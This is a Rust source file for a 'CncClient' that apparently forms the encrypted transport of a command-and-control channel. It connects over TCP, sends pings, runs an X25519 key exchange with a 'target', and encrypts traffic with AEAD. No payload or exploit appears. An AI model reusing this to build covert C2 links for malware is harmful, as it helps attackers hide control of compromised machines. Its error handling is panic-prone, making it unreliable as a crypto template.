use super::CncClient;

use std::{net::{TcpStream, Shutdown}, time::SystemTime, io::ErrorKind, num::NonZeroU32};
use std::io::{Read, Write};
use libvoid::{enums::Protocol, errors::{ProtocolError, ProtocolResult}, crypto::Crypto};
use ring::{rand::{SystemRandom, SecureRandom}, agreement, digest, pbkdf2};
use crate::{CNC_PING_INTERVAL};

use log::{error, info};

impl CncClient {

    pub fn connect(&mut self) -> std::io::Result<()> {
        let conn = TcpStream::connect(&self.addr)?;
        self.stream = Some(conn);
        Ok(()) 
    }

    pub fn recv(&mut self) -> std::io::Result<usize> {
        match &mut self.stream {
            Some(stream) => {
                let mut final_buf = Vec::<u8>::new();
                let mut buf = [0u8; 1024];
                let mut bytes_read: usize = 0; 

                // We read in a loop in case the data is more than 1024 bytes
                loop {
                    let cur_read = match stream.read(&mut buf) {
                        Ok(read) => read,
                        Err(e) => if e.kind() == ErrorKind::WouldBlock { // Nothing wrong, just nothing to read at this point.
                            0
                        } else {
                            error!("Unknown error in recv: {:?}", e);
                            break;
                        }
                    };
                    if cur_read == 0 { break; }
                    final_buf.append(&mut buf[..cur_read].to_vec());
                    bytes_read += cur_read;
                    buf = [0u8; 1024];
                }
                self.readbuf.append(&mut final_buf);
                if self.is_init && bytes_read > 0 {
                    self.readbuf = self.decrypt();
                }
                Ok(bytes_read)
            },
            None => Ok(0)
        }
    }

    pub fn read_non_block(&mut self, data: &mut Vec<u8>) -> std::io::Result<usize> {
        match &mut self.stream {
            Some(stream) => {
                let mut buf = [0u8; 1024];
                let bytes_read = match stream.read(&mut buf) {
                    Ok(read) => read,
                    Err(e) => {
                        error!("Error in read_non_block: {:?}", e);
                        0
                    }
                };
                data.append(&mut buf[..bytes_read].to_vec());
                Ok(bytes_read)
            },
            None => Ok(0)
        }
    }

    pub fn send(&mut self) -> Result<usize, std::io::Error> {
        let mut bytes_sent = 0;
        if self.is_init {
            self.encrypt();
        }
        match &mut self.stream {
            Some(stream) => {
                loop {
                    let cur_sent = stream.write(&self.writebuf[..])?;
                    bytes_sent += cur_sent;
                    self.writebuf.drain(0..cur_sent);

                    if self.writebuf.len() == 0 {break;}
                }
                stream.flush()?;
                Ok(bytes_sent)
            },
            None => Ok(0)
        }
    }

    pub fn write(&mut self, buf: &[u8]) {
        self.writebuf.append(&mut buf.to_vec())
    }

    pub fn ready_to_send(&self) -> bool {
        self.writebuf.len() > 0
    }

    pub fn set_init(&mut self) {
        self.is_init = true;
    }

    pub fn should_ping(&mut self) -> ProtocolResult<()> {
        if !self.is_init {return Ok(())};

        if let Ok(seconds) = self.lastping.elapsed() {
            if seconds.as_secs() > CNC_PING_INTERVAL {
                self.send_ping()
            } else {
                Ok(())
            }
        } else {
            return Err(ProtocolError::Ping);
        }
    }

    pub fn set_nonblocking(&mut self, val: bool) -> std::io::Result<()> {
        match &mut self.stream {
            Some(conn) => conn.set_nonblocking(val),
            None => Ok(())
        }
    }

    pub fn teardown_connection(&mut self) -> std::io::Result<()> {
        match &self.stream {
            Some(stream) => {
                stream.shutdown(Shutdown::Both).unwrap_or(());
                self.is_init = false;
                self.crypto.reset();
                self.stream = None;
                Ok(())
            },
            None => Ok(())
        }
    }

    pub fn send_ping(&mut self) -> ProtocolResult<()> {

        info!("Ping");
        self.lastping = SystemTime::now();
        Ok(self.write(&[Protocol::Ping.value()]))
    }

    pub fn reset_ping(&mut self) -> ProtocolResult<()> {
        self.lastping = SystemTime::now();
        Ok(())
    }

    pub fn initiate(&mut self, phase: u8) -> ProtocolResult<()> {
        // First, send the public_key for the agreement, with the nonce_seed.

        let rng = SystemRandom::new();
        let private_key = agreement::EphemeralPrivateKey::generate(&agreement::X25519, &rng).unwrap();
        let public_key = private_key.compute_public_key().unwrap();
    
        let mut buf = Vec::<u8>::new();
    
        match phase {
            1 => buf.push(Protocol::Helo.value()),
            2 => buf.push(Protocol::SetPhase2Secret.value()),
            _ => return Err(ProtocolError::Encryption(format!("Phase {} unknown", phase)))
        }
    
        let mut nonce_seed = [0u8; 12];
        rng.fill(&mut nonce_seed).unwrap();
    
        if phase == 1 {
            buf.append(&mut self.crypto.get_helo_as_vec());
        }
        buf.append(&mut nonce_seed.to_vec());
        buf.append( &mut public_key.as_ref().to_vec() );
    
        self.write(&buf[..]);
        self.send().unwrap();
        drop(buf);
    
        // Now we wait for the target to do the same and send it's public_key.
    
        let mut res: Vec<u8> = Vec::new();
        self.read_non_block(&mut res).unwrap();
    
        let command = Protocol::try_from(res[0])?;
    
        res.drain(0..1);
        match command {
            Protocol::ReturnPhase1Secret | Protocol::ReturnPhase2Secret => {
                let peer_public_key = ring::agreement::UnparsedPublicKey::new(
                    &ring::agreement::X25519, 
                    res
                );

                // We got the key, now we can perform the agreement
                let mut key = [0u8; digest::SHA256_OUTPUT_LEN];
                agreement::agree_ephemeral(
                    private_key,
                    &peer_public_key,
                    ring::error::Unspecified,
                    |key_material| {
                        // pbkdf2 is probably overkill as there's enough entropy in key_material already
                        // need to change that to HKDF or BLACK3 in KDF mode
                        Ok(pbkdf2::derive(
                            pbkdf2::PBKDF2_HMAC_SHA256, 
                            NonZeroU32::new(100_000).unwrap(), 
                            (self.get_local_addr() + format!("{}", phase).as_ref()).as_bytes(), 
                            key_material, 
                            &mut key
                        ))
                    }
                ).unwrap();
    
                if phase == 1 {
                    self.crypto.set_opening_key(key, nonce_seed)
                } else if phase == 2 {
                    self.crypto.set_sealing_key(key, nonce_seed);
                }

                Ok(())
            },
            _ => return Err(ProtocolError::InvalidProtocol(command as u8))
        }
    }

    pub fn key_exchane_ok(&mut self) -> ProtocolResult<()> {
        self.write(&[Protocol::KeyExchangeOk.value()]);
        self.send().unwrap();
        self.set_nonblocking(true).unwrap();
        self.set_init();
        Ok(())
    }

    fn encrypt(&mut self) {
        self.crypto.get_sealing_key().unwrap().seal_in_place_append_tag(ring::aead::Aad::empty(), &mut self.writebuf).unwrap()
    }

    fn decrypt(&mut self) -> Vec<u8> {
        self.crypto.get_opening_key().unwrap().open_in_place(ring::aead::Aad::empty(), &mut self.readbuf).unwrap().to_vec()
    }
}